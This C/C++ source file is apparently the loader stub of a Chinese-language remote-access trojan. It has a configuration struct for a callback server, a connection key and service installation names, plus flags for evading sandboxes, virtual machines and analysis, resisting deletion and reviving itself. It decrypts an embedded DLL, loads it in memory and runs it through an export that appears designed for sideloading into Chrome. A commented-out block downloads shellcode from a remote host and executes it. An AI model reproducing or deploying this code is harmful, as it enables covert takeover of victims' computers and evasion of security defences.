#include "stdafx.h"

#include "../Install/ShellCode.h"
#include "../Install/MemLoadDll.h"

struct DLL_INFO
{
	char LoginAddr[30];     // 上线地址 1  
	UINT LoginPort;         // 上线端口 2
	WORD FileAttribute;     // 文件属性 3
	char UpGroup[30];       // 上线分组 4
	char ConnetPass[20];    // 通讯秘钥 5
	TCHAR ReleaseName[25];  // 安装名称 6
	char ServiceName[70];   // 服务名称 7
	char ServiceDisplayName[70]; // 服务显示 8
	char ServiceDescription[120];// 服务描述 9
	char ReleasePath[100];  // 安装路径 10
	CHAR szDownRun[150];    // 捆绑地址 11
	char Dele_zc;           // 启动类型 12
	BOOL Fwb;               // 微步 13
	BOOL Fhb;               // 哈勃 14
	BOOL Fxn;               // 虚拟 15
	BOOL Ffx;               // 分析 16
	BOOL Fsc;               // 防删 17
	BOOL Fzs;               // 自删 18
	BOOL Fcf;               // 重复 19
	BOOL Ffh;               // 复活 20
	BOOL Fct;               // 穿透 21
	BOOL Fzj;               // 终结 22
	BOOL Fkb;               // 捆绑 23
	BOOL Fsm;               // 睡眠 24
	BOOL Flx;               // 离线 25
	BOOL Fwr;               // 微软 26
}dll_info = 
{
	"SVP7",       // 上线地址 1
		0,        // 上线端口 2
		0,        // 文件属性 3
		"",       // 上线分组 4
		"",       // 通讯密码 5
		"",       // 安装名称 6
		"",       // 服务名称 7
		"",       // 服务显示 8
		"",	      // 服务描述 9
		"",       // 安装途径 10
		"",       // 网络捆绑 11
		0,        // 启动类型 12
		0,        // 0关闭 1开启 微步检测 13
		0,        // 0关闭 1开启 哈勃检测 14
		0,        // 0关闭 1开启 虚拟检测 15
		0,        // 0关闭 1开启 分析检测 16
		0,        // 0关闭 1开启 防删检测 17
		0,        // 0关闭 1开启 自删检测 18
		0,        // 0关闭 1开启 重复检测 19
		0,        // 0关闭 1开启 复活检测 20
		0,        // 0关闭 1开启 穿透检测 21
		0,        // 0关闭 1开启 终结检测 22
		0,        // 0关闭 1开启 捆绑检测 23
		0,        // 0关闭 1开启 睡眠检测 24
		0,        // 0关闭 1开启 离线检测 25
		0,        // 0关闭 1开启 微软杀毒 26
};

void EncryptData(char *szRec,long nLen,long key) //解密插件
{
	unsigned long i;
	unsigned char p;
	
	p = (unsigned char ) key % 1451 + 61;
	for(i = 0; i < nLen; i++)
	{
		*szRec ^= p;
		*szRec += p;
		szRec++;
	}
}
typedef int (WINAPI *SB360RUN)(DLL_INFO);
void LoadLib( const char *name)
{
	HMEMORYMODULE hDll;
	SB360RUN pfn;
	EncryptData ((char *)g_ShellCodeFileBuff, g_ShellCodeFileSize,1024);	
	hDll=MemoryLoadLibrary(g_ShellCodeFileBuff);
	if (hDll==NULL)
		return ;
	pfn=(SB360RUN)MemoryGetProcAddress(hDll,name);
	if (pfn==NULL)
	{
		MemoryFreeLibrary(hDll);
		return;
	}
	pfn(dll_info);
	if (hDll!=NULL)
	{
		MemoryFreeLibrary(hDll);
		hDll=NULL;
		
	}
	ExitProcess(0);	
}
/*
#include "stdafx.h"
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#pragma comment(lib, "wininet.lib")
void DownloadFile(const std::string& url, const std::string& filePath)
{
    HINTERNET hInternet = InternetOpen("DownloadApp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        std::cout << "无法打开Internet连接" << std::endl;
        return;
    }
    HINTERNET hURL = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hURL == NULL)
    {
        std::cout << "无法打开URL: " << url << std::endl;
		//就是url远程命令 调用zip
        InternetCloseHandle(hInternet);
        return;
    }
    HANDLE hFile = CreateFile(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        std::cout << "无法创建文件: " << filePath << std::endl;
        InternetCloseHandle(hURL);
        InternetCloseHandle(hInternet);
        return;
    }
    char buffer[4096];
    DWORD bytesRead, bytesWritten;
    while (InternetReadFile(hURL, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
    {
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    }
    CloseHandle(hFile);
    InternetCloseHandle(hURL);
    InternetCloseHandle(hInternet);
    std::cout << "文件下载成功: " << filePath << std::endl;
}

#include<windows.h> 
#include<urlmon.h> //这个可以不要 
#include<process.h> //这个可以不要 
#include<Shellapi.h> //这个是对ShellExecute的定义 
#pragma comment (lib,"Urlmon.lib") //这个也可以不要，有DLL可以用


extern "C" __declspec(dllexport) LPVOID SignalChromeElf()

	{

	
	//	URLDownloadToFile(NULL,"http://地址/svchost.exe","C:\\svchost.exe",0,NULL); 
		//在下载木马的地址下载咱们的后门小马，并保存到C:\test.exe 
	//	Sleep(5000);
	//	ShellExecute(0,"open","c:\\svchost.exe",NULL,NULL,SW_SHOW); 
		//执行test.exe 


	URLDownloadToFile(NULL,"http://192.168.56.128/shell.txt","C:\\ProgramData\shell.txt",0,NULL); 
	


	HANDLE fp;
	unsigned char *fBuffer;
	DWORD fSize, dwSize;
	fp = CreateFile("C:\\ProgramData\\shell.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	fSize = GetFileSize(fp, 0);
	unsigned char *readBuffer = (unsigned char *)malloc(fSize);
	ReadFile(fp, readBuffer, fSize, &dwSize, 0);
	CloseHandle(fp);
	HANDLE hFileMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, fSize, NULL);
	if (hFileMapping == NULL)
	{
		// Handle error
	}
	fBuffer = (unsigned char *)MapViewOfFile(hFileMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, fSize);
	if (fBuffer == NULL)
	{
		// Handle error
	}	
	memcpy(fBuffer, readBuffer, fSize);
	DWORD oldProtect;
	VirtualProtect(fBuffer, fSize, PAGE_EXECUTE_READ, &oldProtect);
	_asm
	{
		pushad;
		mov eax, fBuffer;
		call eax;
		popad;
	}
	// Restore memory region protection
	VirtualProtect(fBuffer, fSize, oldProtect, &oldProtect);
	// Free the memory
	UnmapViewOfFile(fBuffer);
	CloseHandle(hFileMapping);
	
	return 0;
}*/


extern "C" __declspec(dllexport) LPVOID SignalChromeElf()
{

		char SVP7[]={'S','V','P','7','\0'};
		LoadLib(SVP7);
		return 0;
	
}



